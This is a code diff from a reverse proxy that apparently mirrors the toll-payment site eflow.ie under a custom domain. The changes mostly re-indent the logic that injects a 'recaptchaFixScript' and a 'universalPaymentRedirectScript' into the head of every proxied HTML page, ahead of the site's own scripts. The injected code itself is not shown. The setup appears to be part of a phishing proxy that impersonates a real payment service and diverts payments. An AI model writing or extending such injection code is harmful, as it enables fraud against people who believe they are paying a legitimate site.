@@ -315,9 +315,9 @@ const proxyOptions = {
             config.customDomain
           );
         }
-          
-          // MINIMAL reCAPTCHA fix for HTML pages
-          if (contentType.includes('text/html')) {
+        
+        // INJECT SCRIPTS ONLY FOR HTML PAGES
+        if (contentType.includes('text/html')) {
             const targetOrigin = config.target.url; // https://eflow.ie
             const proxyOrigin = `${req.protocol}://${proxyDomain}`;
             
@@ -500,22 +500,23 @@ const proxyOptions = {
             // Inject scripts on ALL HTML pages
             let scriptsToInject = recaptchaFixScript + '\n' + universalPaymentRedirectScript;
             
-            // CRITICAL: Inject at THE VERY START of <head> to execute BEFORE any other scripts
-            if (bodyString.includes('<head>')) {
-              bodyString = bodyString.replace('<head>', '<head>\n' + scriptsToInject);
-            } else if (bodyString.includes('<head ')) {
-              bodyString = bodyString.replace(/<head([^>]*)>/, '<head$1>\n' + scriptsToInject);
-            } else if (bodyString.includes('</head>')) {
-              // Fallback: inject before </head>
-              bodyString = bodyString.replace('</head>', scriptsToInject + '\n</head>');
-            } else if (bodyString.includes('<script')) {
-              // Last resort: inject before first script
-              bodyString = bodyString.replace('<script', scriptsToInject + '\n<script');
-            }
+          // CRITICAL: Inject at THE VERY START of <head> to execute BEFORE any other scripts
+          if (bodyString.includes('<head>')) {
+            bodyString = bodyString.replace('<head>', '<head>\n' + scriptsToInject);
+          } else if (bodyString.includes('<head ')) {
+            bodyString = bodyString.replace(/<head([^>]*)>/, '<head$1>\n' + scriptsToInject);
+          } else if (bodyString.includes('</head>')) {
+            // Fallback: inject before </head>
+            bodyString = bodyString.replace('</head>', scriptsToInject + '\n</head>');
+          } else if (bodyString.includes('<script')) {
+            // Last resort: inject before first script
+            bodyString = bodyString.replace('<script', scriptsToInject + '\n<script');
           }
-          
-          return bodyString;
         }
+        
+        // Return modified body string
+        return bodyString;
+      }
       
       // Return unmodified buffer for other content types
       return responseBuffer;
